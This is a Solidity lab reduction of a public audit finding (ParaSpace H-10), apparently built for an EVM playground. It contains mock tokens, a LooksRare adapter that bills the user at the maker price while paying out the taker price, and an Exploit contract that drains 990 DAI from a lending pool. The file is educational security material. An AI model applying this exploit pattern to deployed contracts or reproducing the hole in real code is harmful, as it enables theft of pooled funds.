// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ParaSpace - [H-10] Attacker can drain pool using executeBuyWithCredit
    (Code4rena 2022-11-paraspace; #15983, reporter Trust)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: LooksRareAdapter.getAskOrderInfo builds consideration from
    makerAsk.price only, while the exchange transfer uses takerBid.price.
    Attacker (both sides) sets maker=10, taker=1000 → user is charged 10 but
    pool pays 1000, draining 990 of pool inventory.
    Vulnerable consideration construction preserved verbatim (@>). */

contract MockERC20 {
    string public name = "DAI";
    string public symbol = "DAI";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockNFT {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "own");
        ownerOf[id] = to;
    }
}

struct MakerOrder {
    bool isOrderAsk;
    address signer;
    address collection;
    uint256 price;
    uint256 tokenId;
    address currency;
}

struct TakerOrder {
    bool isOrderAsk;
    address taker;
    uint256 price;
    uint256 tokenId;
}

struct ConsiderationItem {
    uint8 itemType;
    address token;
    uint256 identifier;
    uint256 startAmount;
    uint256 endAmount;
    address payable recipient;
}

struct OrderInfo {
    address maker;
    ConsiderationItem[] consideration;
}

/// @dev Reduced LooksRareAdapter.getAskOrderInfo - consideration uses maker price only.
contract LooksRareAdapter {
    function getAskOrderInfo(bytes calldata params, address /*weth*/)
        external
        pure
        returns (OrderInfo memory orderInfo)
    {
        (TakerOrder memory takerBid, MakerOrder memory makerAsk) =
            abi.decode(params, (TakerOrder, MakerOrder));
        orderInfo.maker = makerAsk.signer;

        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem({
            itemType: 1,
            token: makerAsk.currency,
            identifier: 0,
            startAmount: makerAsk.price, // @> VULN: maker price only - exchange actually moves takerBid.price
            endAmount: makerAsk.price,
            // FIX: require(makerAsk.price == takerBid.price)
            recipient: payable(takerBid.taker)
        });
        orderInfo.consideration = consideration;
    }
}

/// @dev Reduced Pool + LooksRareExchange matchAskWithTakerBid (charges taker price).
contract PoolMarketplace {
    MockERC20 public dai;
    LooksRareAdapter public adapter;

    constructor(MockERC20 _dai, LooksRareAdapter _adapter) {
        dai = _dai;
        adapter = _adapter;
    }

    function buyWithCredit(bytes calldata payload, uint256 creditAmount, address payer) external {
        OrderInfo memory orderInfo = adapter.getAskOrderInfo(payload, address(0));

        uint256 price = 0;
        for (uint256 i = 0; i < orderInfo.consideration.length; i++) {
            ConsiderationItem memory item = orderInfo.consideration[i];
            require(item.startAmount == item.endAmount, "INVALID_MARKETPLACE_ORDER");
            require(item.itemType == 1, "INVALID_ASSET_TYPE");
            price += item.startAmount; // charged to user = maker price
        }

        require(creditAmount <= price, "credit");
        uint256 downpayment = price - creditAmount;
        dai.transferFrom(payer, address(this), downpayment);

        // Exchange path: LooksRare uses takerBid.price (not maker).
        (TakerOrder memory takerBid, MakerOrder memory makerAsk) =
            abi.decode(payload, (TakerOrder, MakerOrder));
        require(!takerBid.isOrderAsk && makerAsk.isOrderAsk, "sides");
        // _transferFeesAndFunds(..., takerBid.price)
        dai.transfer(makerAsk.signer, takerBid.price);
        MockNFT(makerAsk.collection).transferFrom(makerAsk.signer, takerBid.taker, makerAsk.tokenId);
    }
}

contract AttackerWallet {
    function approve(MockERC20 t, address sp, uint256 amt) external {
        t.approve(sp, amt);
    }

    function buy(PoolMarketplace pool, bytes calldata payload) external {
        pool.buyWithCredit(payload, 0, address(this));
    }
}

contract Exploit {
    MockERC20 public dai; // CREATE 1
    MockNFT public nft; // CREATE 2
    LooksRareAdapter public adapter; // CREATE 3 - vulnerable
    PoolMarketplace public pool; // CREATE 4
    AttackerWallet public attacker; // CREATE 5

    uint256 public constant PAY_NOW = 10 ether;
    uint256 public constant POOL_VICTIM = 990 ether;
    uint256 public constant TAKER_PRICE = 1000 ether;
    uint256 public constant TOKEN_ID = 1;

    constructor() {
        dai = new MockERC20();
        nft = new MockNFT();
        adapter = new LooksRareAdapter();
        pool = new PoolMarketplace(dai, adapter);
        attacker = new AttackerWallet();

        dai.mint(address(pool), POOL_VICTIM);
        dai.mint(address(attacker), PAY_NOW);
        nft.mint(address(attacker), TOKEN_ID);
    }

    function run() external {
        attacker.approve(dai, address(pool), PAY_NOW);

        MakerOrder memory makerAsk = MakerOrder({
            isOrderAsk: true,
            signer: address(attacker),
            collection: address(nft),
            price: PAY_NOW,
            tokenId: TOKEN_ID,
            currency: address(dai)
        });
        TakerOrder memory takerBid = TakerOrder({
            isOrderAsk: false,
            taker: address(attacker),
            price: TAKER_PRICE,
            tokenId: TOKEN_ID
        });
        bytes memory payload = abi.encode(takerBid, makerAsk);

        uint256 before = dai.balanceOf(address(attacker));
        attacker.buy(pool, payload);
        uint256 afterBal = dai.balanceOf(address(attacker));

        // Paid 10, received 1000 → net +990; pool inventory gone; NFT retained.
        require(afterBal == before - PAY_NOW + TAKER_PRICE, "profit");
        require(afterBal == before + POOL_VICTIM, "drained 990");
        require(dai.balanceOf(address(pool)) == 0, "pool empty");
        require(nft.ownerOf(TOKEN_ID) == address(attacker), "nft");
    }
}
